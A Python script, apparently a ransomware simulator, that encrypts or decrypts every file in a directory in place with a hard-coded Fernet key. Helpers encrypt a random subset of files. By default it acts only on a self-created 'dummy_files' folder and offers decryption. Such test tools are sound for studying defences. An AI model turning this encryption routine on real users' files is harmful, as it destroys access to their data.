
from cryptography.fernet import Fernet
import os
import sys







TARGET_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "dummy_files")


KEY = b'Cfo50KisDfYHSTMoSrF6HcICBVGQp5cAXI7CeuC0mRM='


def _is_encrypted(data):
    try:
        return data.startswith(b'gAAAAA')
    except Exception:
        return False

def encrypt_file(file_path, key=KEY):
    try:
        f = Fernet(key)
        with open(file_path, "rb") as file_data:
            file_content = file_data.read()

        if _is_encrypted(file_content):
            print(f"Already encrypted, skipping: {file_path}")
            return True

        encrypted_content = f.encrypt(file_content)

        with open(file_path, "wb") as file_data:
            file_data.write(encrypted_content)

        print(f"Successfully encrypted: {file_path}")
        return True
    except Exception as e:
        print(f"Failed to encrypt {file_path}: {e}")
        return False

def decrypt_file(file_path, key=KEY):
    try:
        f = Fernet(key)
        with open(file_path, "rb") as file_data:
            encrypted_content = file_data.read()

        if not _is_encrypted(encrypted_content):
            print(f"Not encrypted, skipping: {file_path}")
            return True

        decrypted_content = f.decrypt(encrypted_content)

        with open(file_path, "wb") as file_data:
            file_data.write(decrypted_content)

        print(f"Successfully decrypted: {file_path}")
        return True
    except Exception as e:
        print(f"Failed to decrypt {file_path}: {e}")
        return False

def encrypt_target(target_dir, key=KEY):
    print(f"Starting encryption on: {target_dir}")

    count = 0
    for root, dirs, files in os.walk(target_dir):
        for file in files:
            file_path = os.path.join(root, file)
            if encrypt_file(file_path, key):
                print(f"Encrypted: {file_path}")
                count += 1

    print(f"Encryption complete. {count} files processed.")

def decrypt_target(target_dir, key=KEY):
    print(f"Starting decryption on: {target_dir}")

    count = 0
    for root, dirs, files in os.walk(target_dir):
        for file in files:
            file_path = os.path.join(root, file)
            if decrypt_file(file_path, key):
                print(f"Decrypted: {file_path}")
                count += 1

    print(f"Decryption complete. {count} files processed.")

def encrypt_random_files(file_list, count, key=KEY):
    import random
    import ast
    shuffled = list(file_list)
    random.shuffle(shuffled)

    processed = 0
    for file_path in shuffled:
        if processed >= count:
            break

        try:
            with open(file_path, "rb") as f:
                content = f.read(16)                               

            if not _is_encrypted(content):
                if encrypt_file(file_path, key):
                    processed += 1
        except Exception:
            pass                        

    return processed

def decrypt_random_files(file_list, count, key=KEY):
    import random
    shuffled = list(file_list)
    random.shuffle(shuffled)

    processed = 0
    for file_path in shuffled:
        if processed >= count:
            break

        try:
            with open(file_path, "rb") as f:
                content = f.read(16)

            if _is_encrypted(content):
                if decrypt_file(file_path, key):
                    processed += 1
        except Exception:
            pass

    return processed

def decrypt_all_files(file_list, key=KEY):
    processed = 0
    for file_path in file_list:
        try:
            with open(file_path, "rb") as f:
                content = f.read(16)

            if _is_encrypted(content):
                if decrypt_file(file_path, key):
                    processed += 1
        except Exception:
            pass

    return processed

if __name__ == "__main__":
    if not os.path.exists(TARGET_DIR):
        print(f"Creating dummy target directory: {TARGET_DIR}")
        os.makedirs(TARGET_DIR, exist_ok=True)

        with open(os.path.join(TARGET_DIR, "test.txt"), "w") as f:
            f.write("This is a test file for encryption.")

    print(f"Target Directory: {TARGET_DIR}")
    print(f"Using Hardcoded Key: {KEY}")
    print("-" * 30)
    print("Options:")
    print("1. Encrypt Target Directory")
    print("2. Decrypt Target Directory")

    choice = input("Enter choice (1/2): ")

    if choice == "1":
        encrypt_target(TARGET_DIR)
    elif choice == "2":
        decrypt_target(TARGET_DIR)
    else:
        print("Invalid choice.")
